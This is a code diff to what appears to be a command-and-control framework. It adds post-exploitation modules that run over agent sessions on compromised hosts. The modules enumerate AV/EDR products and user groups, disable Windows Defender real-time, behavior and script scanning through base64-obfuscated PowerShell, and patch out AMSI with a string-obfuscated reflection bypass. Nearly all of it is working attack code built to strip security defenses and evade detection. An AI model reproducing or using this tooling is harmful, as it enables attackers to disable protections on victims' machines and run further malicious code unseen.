@@ -4,6 +4,8 @@ import subprocess
 import argparse
 import threading
 import textwrap
+import base64
+import struct
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from core.session_handlers import session_manager
 from core import shell
@@ -1201,3 +1203,276 @@ def _do_steal_and_launch(sid, pid, ps_payload):
 
     else:
         return brightred + f"[!] Unsupported session type!"
+
+def getav(sid, os_type):
+    """
+    Run a PowerShell one‑liner (via SecurityCenter2, registry, services, processes)
+    to detect AV/EDR products on Windows. On non‑Windows, just prints a warning.
+    """
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+
+    if "windows" not in os_type:
+        return brightyellow + "[*] getav only supported on Windows targets"
+
+    ps = f"""
+function Get-AV_EDR {{
+    try {{
+        $avProducts = Get-CimInstance -Namespace root\\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop
+        if ($avProducts) {{
+            Write-Output "`n=== Enumerating AV via SecurityCenter2 ==="
+            Write-Output $avProducts
+        }} else {{
+
+        }}
+    }} catch {{
+    
+    }}
+
+    $regPaths = @(
+        'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',
+        'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
+    )
+    $installed = foreach ($p in $regPaths) {{
+        Get-ItemProperty $p -ErrorAction SilentlyContinue |
+          Where-Object {{ $_.DisplayName }} |
+          Select-Object DisplayName, DisplayVersion, Publisher
+    }}
+    $filters = 'Symantec','McAfee','Defender','Windows Defender','Carbon Black','CrowdStrike',
+               'SentinelOne','Palo Alto','Cylance','FireEye','Trend Micro','Sophos',
+               'Kaspersky','ESET','Avast','AVG'
+    $securityApps = $installed | Where-Object {{
+        $filters | ForEach-Object {{ $_ }} | Where-Object {{ $installed.DisplayName -like "*$_*" }}
+    }}
+    if ($securityApps) {{
+        Write-Output "`n=== Enumerating Installed Security Products (Registry) ==="
+        $securityApps | Sort-Object DisplayName | Format-Table -AutoSize
+    }} else {{
+        
+    }}
+
+    $svcFilters = 'WinDefend','MsMpSvc','Sense','McAfee','FalconService','SentinelAgent',
+                  'PaloAlto','Trend','Sophos','Kaspersky','ekrn','avast','avg'
+    $avServices = Get-Service | Where-Object {{
+        $svcFilters | ForEach-Object {{ $_ }} | Where-Object {{ $_.Name -match $_ }}
+    }} | Select-Object Name, DisplayName, Status
+    if ($avServices) {{
+        Write-Output "`n=== Enumerating Running Services for AV/EDR ==="
+        $avServices | Format-Table -AutoSize
+    }} else {{
+        
+    }}
+
+    $procNames = 'CarbonBlack','CSFalconService','CrowdStrike','SentinelOne',
+                 'CiscoSecureEndpoint','Cybereason','Checkpoint','MsSense','MsMpEng'
+    $edrProcs = Get-Process | Where-Object {{ $procNames -contains $_.ProcessName }} |
+                Select-Object ProcessName, Id, Path
+    if ($edrProcs) {{
+        Write-Output "`n=== Enumerating Known EDR Processes ==="
+        $edrProcs | Format-Table -AutoSize
+    }} else {{
+        Write-Output "Nothing Found"
+    }}
+}}
+
+# Execute
+Get-AV_EDR
+"""
+
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + f"[!] No such session: {display}"
+
+    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
+    ps = (
+      "$ps = [System.Text.Encoding]::Unicode"
+      f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
+    )
+
+    transport = sess.transport.lower()
+    
+    if transport in ("http","https"):
+        out = shell.run_command_http(sid, ps)
+    
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + "[!] No AV/EDR products detected or error"
+
+        else:
+            return out
+
+def groups(sid, os_type):
+    """
+    On Windows: run 'whoami /groups'
+    On Linux:   run 'id -Gn'
+    """
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    # choose the right command
+    if "windows" in os_type:
+        cmd = f"""
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+
+$groups = $user.Groups | ForEach-Object {{
+    # Translate SID → DOMAIN\\GroupName
+    $name = $_.Translate([System.Security.Principal.NTAccount]).Value
+    # Make a PSCustomObject so we can sort & format nicely
+    [PSCustomObject]@{{
+        GroupName = $name
+        SID       = $_.Value
+    }}
+}}
+
+if ($groups) {{
+  $groups | Sort-Object GroupName | Format-Table -AutoSize
+}}
+else {{
+    $out = (whoami /groups)
+    if ($out) {{ Write-Output $out }} else {{ Write-Output "Nothing Found" }}
+}}
+"""
+    else:
+        cmd = "id -Gn"
+
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + f"[!] No such session: {display}"
+
+    if os_type == "windows":
+        b64 = base64.b64encode(cmd.encode('utf-16le')).decode()
+        cmd = (
+        "$ps = [System.Text.Encoding]::Unicode"
+        f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
+        )
+
+
+    # dispatch via HTTP or TCP
+    transport = sess.transport.lower()
+    if transport in ("http", "https"):
+        out = shell.run_command_http(sid, cmd)
+    
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + "[!] User is not part of any groups!"
+
+        else:
+            return out
+
+def defenderoff(sid, os_type):
+    """
+    Disable Windows Defender using an obfuscated, base64-encoded PowerShell one‑liner.
+    """
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    if "windows" not in os_type:
+        return brightyellow + "[*] defenderoff only supported on Windows"
+
+    # this PS snippet turns off key Defender features
+    raw_ps = f"""
+try {{
+    $ErrorActionPreference = \"SilentlyContinue\"
+    $real = (Set-MpPreference -DisableRealtimeMonitoring $true)
+    $bee = (Set-MpPreference -DisableBehaviorMonitoring $true)
+    $first = (Set-MpPreference -DisableBlockAtFirstSeen $true)
+    $iopro = (Set-MpPreference -DisableIOAVProtection $true)
+    $scscan = (Set-MpPreference -DisableScriptScanning $true)
+
+    if (($real) -or ($bee) -or ($first) -or (iopro) -or ($scscan)) {{
+        Write-Output "Good Job"
+    }} else {{ Write-Output "Nothing Found" }}
+
+}} catch {{ Write-Output "Nothing Found" }}
+"""
+    # obfuscate via UTF-16LE + Base64
+    b64 = base64.b64encode(raw_ps.encode('utf-16le')).decode()
+    ps_cmd = (
+        "[Text.Encoding]::Unicode.GetString"
+        "([Convert]::FromBase64String(\"" + b64 + "\")) | Invoke-Expression"
+    )
+
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + f"[!] No such session: {display}"
+
+    transport = sess.transport.lower()
+
+    if transport in ("http", "https"):
+        out = shell.run_command_http(sid, ps_cmd)
+
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=1.0, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + "[!] Failed to disable defender!"
+
+        elif "Good Job" in out:
+            return "[+] Successfully disabled defender."
+
+def amsioff(sid, os_type):
+    """
+    Disable AMSI in‑memory via reflection bypass.
+    """
+    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+    if "windows" not in os_type:
+        return brightyellow + "[*] amsioff only supported on Windows"
+
+    # your one‑liner, wrapped for base64‑UTF16LE
+    raw_ps = f"""
+$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]](
+    83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,
+    116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,
+    105,85,116,105,108,115
+))))
+$n='Non'+'Public'; $s='Static'
+$f=$e.GetField(
+    ([string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),
+    "$n,$s"
+)
+$t=[type[]]@([object],[bool])
+$m=$f.GetType().GetMethod('Set'+'Value',$t)
+$test = ($m.Invoke($f,@($null,$true)))
+
+if (-not $test) {{ Write-Output "Success" }} else {{ Write-Output "Nothing Found" }}
+"""
+    b64 = base64.b64encode(raw_ps.encode('utf-16le')).decode()
+    ps_cmd = "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\")) | Invoke-Expression"
+
+    sess = session_manager.sessions.get(sid)
+    if not sess:
+        return brightred + f"[!] No such session: {display}"
+
+    transport = sess.transport.lower()
+
+    # dispatch (bypassing defender)
+    if transport in ("http","https"):
+        out = shell.run_command_http(sid, ps_cmd)
+    
+    elif transport in ("tcp", "tls"):
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+
+    else:
+        return brightred + "[!] Unknown session transport!"
+
+    if out:
+        if "Nothing Found" in out:
+            return brightred + f"[!] Failed to bypass AMSI!"
+
+        elif "Success" in out:
+            return "[+] Successfully bypassed AMSI."
+
+        else:
+            return brightred + "[!] An error ocurred on agent!"
